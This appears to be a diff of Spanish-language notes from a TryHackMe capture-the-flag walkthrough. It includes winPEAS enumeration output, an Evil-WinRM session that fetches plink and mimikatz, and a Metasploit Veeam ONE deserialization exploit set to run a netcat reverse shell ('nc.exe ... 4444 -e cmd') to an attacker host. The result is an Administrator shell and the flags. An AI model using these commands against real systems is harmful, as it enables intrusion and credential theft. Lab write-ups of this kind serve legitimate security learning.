     File: C:\Windows\SysWOW64\rundll32.exe C:\Windows\SysWOW64\iesetup.dll,IEHardenAdmin
    =================================================================================================
 
-
     RegPath: HKLM\Software\Wow6432Node\Microsoft\Active Setup\Installed Components\{A509B1A8-37EF-4b3f-8CFC-4F3A74704073}                                                                                                   
     Key: StubPath
     Folder: C:\Windows\SysWOW64
     File: C:\Windows\SysWOW64\rundll32.exe C:\Windows\SysWOW64\iesetup.dll,IEHardenUser
    =================================================================================================
 
-
     Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
     File: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini (Unquoted and Space detected)                                                                                                            
    =================================================================================================
-
 
     Folder: C:\Users\MichelleWat\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
     FolderPerms: MichelleWat [AllAccess]
@@ -5265,26 +5144,21 @@ Error getting autoruns from WMIC: System.Management.ManagementException: Access 
     FilePerms: MichelleWat [AllAccess]
    =================================================================================================
 
-
     Folder: C:\windows\tasks
     FolderPerms: Authenticated Users [WriteData/CreateFiles]
    =================================================================================================
-
 
     Folder: C:\windows\system32\tasks
     FolderPerms: Authenticated Users [WriteData/CreateFiles]
    =================================================================================================
 
-
     Folder: C:\windows
     File: C:\windows\system.ini
    =================================================================================================
 
-
     Folder: C:\windows
     File: C:\windows\win.ini
    =================================================================================================
-
 
 ÉÍÍÍÍÍÍÍÍÍÍ¹ Scheduled Applications --Non Microsoft--
 È Check if you can modify other users scheduled binaries https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries                                        
@@ -5346,7 +5220,6 @@ Error getting autoruns from WMIC: System.Management.ManagementException: Access 
     XENIFACE - 8.2.5.39 [Amazon Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\xeniface.sys
     XENNET - 8.2.5.32 [Amazon Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\xennet.sys
 
-
 ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Network Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
 
 ÉÍÍÍÍÍÍÍÍÍÍ¹ Network Shares
@@ -5374,7 +5247,6 @@ Error getting autoruns from WMIC: System.Management.ManagementException: Access 
         DNSs: fec0:0:0:ffff::1%1, fec0:0:0:ffff::2%1, fec0:0:0:ffff::3%1
         Known hosts:
           224.0.0.22            00-00-00-00-00-00     Static
-
 
 ÉÍÍÍÍÍÍÍÍÍÍ¹ Current TCP Listening Ports
 È Check for services restricted from the outside 
@@ -5483,7 +5355,6 @@ Error getting autoruns from WMIC: System.Management.ManagementException: Access 
   Zone Auth Settings                                                                                          
   No Zone Auth Settings
 
-
 ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Windows Credentials ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
 
 ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking Windows Vault
@@ -5494,7 +5365,6 @@ Error getting autoruns from WMIC: System.Management.ManagementException: Access 
 ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking Credential manager
 È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-manager-windows-vault                                                                                                       
     [!] Warning: if password contains non-printable characters, it will be printed as unicode base64 encoded string
-
 
   [!] Unable to enumerate credentials automatically, error: 'Win32Exception: System.ComponentModel.Win32Exception (0x80004005): A specified logon session does not exist. It may already have been terminated'
 Please run:
@@ -5528,7 +5398,6 @@ cmdkey /list
     Modified: 6/15/2020 11:12:07 AM
    =================================================================================================
 
-
 ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking for DPAPI Credential Files
 È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#dpapi
     Not Found
@@ -5560,7 +5429,6 @@ No saved Wifi credentials found
 
 ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Security Packages Credentials
   [X] Exception: Couldn't parse nt_resp. Len: 0 Message bytes: 4e544c4d5353500003000000010001005e000000000000005f000000000000005800000000000000580000000600060058000000000000005f000000058a80a20a0063450000000fd0d07d1eedade3358b1f3dbc7ca717cf53004500540000                                                                             
-
 
 ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Browsers Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
 
@@ -5613,7 +5481,6 @@ No saved Wifi credentials found
 ÉÍÍÍÍÍÍÍÍÍÍ¹ IE favorites
     http://go.microsoft.com/fwlink/p/?LinkId=255142
 
-
 ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Interesting files and registry ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
 
 ÉÍÍÍÍÍÍÍÍÍÍ¹ Putty Sessions
@@ -5644,7 +5511,6 @@ No saved Wifi credentials found
 
     SID: S-1-5-18
    =================================================================================================
-
 
 ÉÍÍÍÍÍÍÍÍÍÍ¹ Cloud Credentials
 È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-inside-files
@@ -5698,7 +5564,6 @@ No saved Wifi credentials found
        Server Authentication
    =================================================================================================
 
-
 ÉÍÍÍÍÍÍÍÍÍÍ¹ Searching known files that can contain creds in home
 È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-inside-files
 
@@ -5730,7 +5595,6 @@ No saved Wifi credentials found
      File Permissions "C:\Users\MichelleWat\Desktop\winPEASany_ofs.exe": MichelleWat [AllAccess]
 
 ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for Linux shells/distributions - wsl.exe, bash.exe
-
 
 ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ File Analysis ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
 
@@ -5764,13 +5628,11 @@ Active Connections
   TCP    10.10.242.97:5985      10.8.19.103:53364      ESTABLISHED     4
   TCP    10.10.242.97:49719     10.10.242.97:2805      ESTABLISHED     5060
 
-
 *Evil-WinRM* PS C:\Users\MichelleWat\Documents> Get-Process -Id 5060
 
 Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
 -------  ------    -----      -----     ------     --  -- -----------
     744      53    54720      74028              5060   0 Veeam.One.Agent.Service
-
 
 Veeam One Agent Service es un servicio de Windows que forma parte de la solución de backup y recuperación de datos de Veeam. Su función es recopilar información sobre el estado de los servidores y dispositivos de almacenamiento en un entorno de TI y enviar esa información a Veeam ONE Server para su análisis. Esto permite a los administradores de TI monitorear el estado de sus servidores y dispositivos de almacenamiento y tomar medidas preventivas para evitar problemas de disponibilidad.
 
@@ -5784,17 +5646,13 @@ https://www.rapid7.com/db/modules/exploit/windows/misc/veeam_one_agent_deseriali
 
 *Evil-WinRM* PS C:\Users\MichelleWat\Documents> Get-ChildItem C:\ -recurse -ErrorAction SilentlyContinue | Where-Object {$_.Name -match "Veeam.One.Agent"}
 
-
     Directory: C:\Program Files\Veeam\Veeam ONE
-
 
 Mode                LastWriteTime         Length Name
 ----                -------------         ------ ----
 d-----         6/7/2020   7:57 AM                Veeam ONE Agent
 
-
     Directory: C:\Program Files\Veeam\Veeam ONE\Veeam ONE Agent
-
 
 Mode                LastWriteTime         Length Name
 ----                -------------         ------ ----
@@ -5806,9 +5664,7 @@ Mode                LastWriteTime         Length Name
 -a----        1/18/2019   7:50 PM         311736 Veeam.One.Agent.Service.exe
 -a----        1/18/2019   7:50 PM          50616 Veeam.One.Agent.Updater.exe
 
-
 Evil-WinRM* PS C:\Users\MichelleWat\Documents> Get-Item 'C:\Program Files\Veeam\Veeam ONE\Veeam ONE Agent\Veeam.One.Agent.Service.exe' | Format-List *
-
 
 PSPath            : Microsoft.PowerShell.Core\FileSystem::C:\Program Files\Veeam\Veeam ONE\Veeam ONE Agent\Veeam.One.Agent.Service.exe
 PSParentPath      : Microsoft.PowerShell.Core\FileSystem::C:\Program Files\Veeam\Veeam ONE\Veeam ONE Agent
@@ -5879,13 +5735,10 @@ hash_michelle      hook.zip  plink.exe  users.xml
 Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
 10.10.242.97 - - [02/Jan/2023 14:35:08] "GET /plink.exe HTTP/1.1" 200 -
 
-
 *Evil-WinRM* PS C:\Users\MichelleWat\Documents> Invoke-WebRequest -Uri http://10.8.19.103:1337/plink.exe -outfile plink.exe
 *Evil-WinRM* PS C:\Users\MichelleWat\Documents> ls
 
-
     Directory: C:\Users\MichelleWat\Documents
-
 
 Mode                LastWriteTime         Length Name
 ----                -------------         ------ ----
@@ -5936,7 +5789,6 @@ Matching Modules
    -  ----                                                  ---------------  ----    -----  -----------
    0  exploit/windows/misc/veeam_one_agent_deserialization  2020-04-15       normal  Yes    Veeam ONE Agent .NET Deserialization
 
-
 Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/misc/veeam_one_agent_deserialization                                                                                              
 
 msf6 > use 0
@@ -5960,7 +5812,6 @@ Module options (exploit/windows/misc/veeam_one_agent_deserialization):
                                              )
    URIPATH                         no        The URI to use for this exploit (default is random)
 
-
 Payload options (windows/x64/meterpreter/reverse_tcp):
 
    Name      Current Setting  Required  Description
@@ -5969,17 +5820,13 @@ Payload options (windows/x64/meterpreter/reverse_tcp):
    LHOST                      yes       The listen address (an interface may be specified)
    LPORT     4444             yes       The listen port
 
-
 Exploit target:
 
    Id  Name
    --  ----
    2   PowerShell Stager
 
-
-
 View the full module info with the info, or info -d command.
-
 
 msf6 exploit(windows/misc/veeam_one_agent_deserialization) > set RHOSTS 127.0.0.1
 RHOSTS => 127.0.0.1
@@ -6507,7 +6354,6 @@ class MetasploitModule < Msf::Exploit::Remote
 
 end
 
-
 La línea `when :win_cmd1` es parte de una estructura de control de flujo condicional, en este caso una estructura `case`. La línea `execute_command(datastore['CMD'])` es una llamada a una función o método que ejecuta un comando en la consola del sistema operativo. La variable `datastore` es un diccionario o hashmap que almacena valores que se pueden utilizar en el contexto del script. En este caso, se está obteniendo el valor del elemento `CMD` del diccionario y se está pasando como parámetro a la función `execute_command`.
 
 Es posible que este código forme parte de un script de Metasploit, una herramienta de seguridad que se utiliza para realizar pruebas de penetración y explotación de vulnerabilidades en sistemas y aplicaciones. En este caso, la estructura `case` puede utilizarse para determinar qué acción realizar en función del valor de una variable. Al ejecutar la función `execute_command` con el valor del elemento `CMD` del diccionario `datastore`, se estaría ejecutando el comando especificado por el usuario en la consola del sistema operativo.
@@ -6556,7 +6402,6 @@ Matching Modules
    -  ----                                                  ---------------  ----    -----  -----------
    0  exploit/windows/misc/veeam_one_agent_deserialization  2020-04-15       normal  Yes    Veeam ONE Agent .NET Deserialization
 
-
 Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/misc/veeam_one_agent_deserialization                                                                                              
 
 msf6 > use 0
@@ -6584,7 +6429,6 @@ Module options (exploit/windows/misc/veeam_one_agent_deserialization):
    URIPATH                                      no        The URI to use for this exploit (default is random
                                                           )
 
-
 Payload options (windows/x64/meterpreter/reverse_tcp):
 
    Name      Current Setting  Required  Description
@@ -6593,14 +6437,11 @@ Payload options (windows/x64/meterpreter/reverse_tcp):
    LHOST                      yes       The listen address (an interface may be specified)
    LPORT     4444             yes       The listen port
 
-
 Exploit target:
 
    Id  Name
    --  ----
    2   PowerShell Stager
-
-
 
 View the full module info with the info, or info -d command.
 
@@ -6629,7 +6470,6 @@ Module options (exploit/windows/misc/veeam_one_agent_deserialization):
    URIPATH                                      no        The URI to use for this exploit (default is random
                                                           )
 
-
 Payload options (windows/x64/exec):
 
    Name      Current Setting                 Required  Description
@@ -6639,14 +6479,11 @@ Payload options (windows/x64/exec):
    EXITFUNC  process                         yes       Exit technique (Accepted: '', seh, thread, process, n
                                                        one)
 
-
 Exploit target:
 
    Id  Name
    --  ----
    3   Windows Set Command
-
-
 
 View the full module info with the info, or info -d command.
 
@@ -6657,7 +6494,6 @@ msf6 exploit(windows/misc/veeam_one_agent_deserialization) > set LHOST 10.8.19.1
 LHOST => 10.8.19.103
 msf6 exploit(windows/misc/veeam_one_agent_deserialization) > set CMD net use a: \\\10.8.19.103\\share /user:me me&a:\nc.exe 10.8.19.103 4444 -e cmd
 CMD => net use a: \10.8.19.103\share /user:me me&a:nc.exe 10.8.19.103 4444 -e cmd
-
 
 escaping
 
@@ -6681,7 +6517,6 @@ Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corpo
 [*] Connecting Share(1:IPC$)
 [*] Connecting Share(2:share)
 [*] Disconnecting Share(1:IPC$)
-
 
 uhmm 
 
@@ -6731,7 +6566,6 @@ Module options (exploit/windows/misc/veeam_one_agent_deserialization):
    SSLCert                                                      no        Path to a custom SSL certificate (default is randomly generated)
    URIPATH                                                      no        The URI to use for this exploit (default is random)
 
-
 Payload options (windows/x64/exec):
 
    Name      Current Setting                                                           Required  Description
@@ -6740,14 +6574,11 @@ Payload options (windows/x64/exec):
              -e cmd
    EXITFUNC  process                                                                   yes       Exit technique (Accepted: '', seh, thread, process, none)
 
-
 Exploit target:
 
    Id  Name
    --  ----
    3   Windows Set Command
-
-
 
 View the full module info with the info, or info -d command.
 
@@ -6789,7 +6620,6 @@ Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corpo
 [*] Disconnecting Share(2:IPC$)
 [*] AUTHENTICATE_MESSAGE (\,SET)
 [*] Could not authenticate user!
-
 
 ┌──(kali㉿kali)-[~]
 └─$ rlwrap nc -lnvp 4444
@@ -6866,7 +6696,6 @@ Local Group Memberships      *Administrators       *Users
 Global Group memberships     *None                 
 The command completed successfully.
 
-
 C:\windows\system32>cd C:\Users\Administrator\Desktop
 cd C:\Users\Administrator\Desktop
 
@@ -6888,8 +6717,6 @@ type flag3.txt
 Flag3: THM{934f7faaadab3b040edab8214789114c9d3049dd}
 
 I am glad we blocked Veeam ONE agent in Firewall, so we can patch it next week.
-
-
 
 :)
 
@@ -6923,9 +6750,7 @@ Invoke-WebRequest -Uri http://10.8.19.103:1337/mimikatz.exe -outfile mimikatz.ex
 PS C:\Users\One\Documents> ls
 ls
 
-
     Directory: C:\Users\One\Documents
-
 
 Mode                LastWriteTime         Length Name                                                                  
 ----                -------------         ------ ----                                                                  
@@ -6954,14 +6779,7 @@ dir
                0 File(s)              0 bytes
                2 Dir(s)  25,279,234,048 bytes free
 
-
-
 ```
-
-![[Pasted image 20230102101942.png]]
-![[Pasted image 20230102122020.png]]
-
-![[Pasted image 20230102150738.png]]
 
 Flag 1
 
@@ -6974,6 +6792,5 @@ Flag 2
 Flag 3
 
 *THM{934f7faaadab3b040edab8214789114c9d3049dd}*
-
 
 [[Atlas]]
